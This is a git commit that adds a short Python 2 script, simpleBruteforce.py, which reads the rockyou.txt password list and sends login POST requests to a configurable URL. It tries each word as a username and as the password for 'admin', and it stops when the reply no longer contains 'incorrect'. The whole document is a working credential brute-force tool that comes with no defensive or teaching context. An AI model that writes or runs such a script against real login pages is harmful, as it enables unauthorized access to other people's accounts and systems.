9e335831675cfe515faf25c6b29159581c866d7e
Ghost56 <94029083+ArchGhost56@users.noreply.github.com>
2021-11-10 20:27:05 +0800

    Create simpleBruteforce.py

---
+++ simpleBruteforce.py
@@ -0,0 +1,25 @@
+import requests
+import sys
+url = "http://"
+expression = "incorrect"
+def brute(username,password):
+	data = {'username':username,'password':password}
+	r = requests.post(url,data=data)
+	if expression not in r.content :
+		print "[+] Correct password Found: ",password
+		sys.exit()
+	else:
+		print r.content," ",password
+
+
+
+
+def main():
+	words = [w.strip() for w in open("rockyou.txt", "rb").readlines()] #parse wordlist
+	for payload in words:
+		brute(payload,"a")
+		brute("admin",payload)
+
+
+if __name__ == '__main__':
+	main()
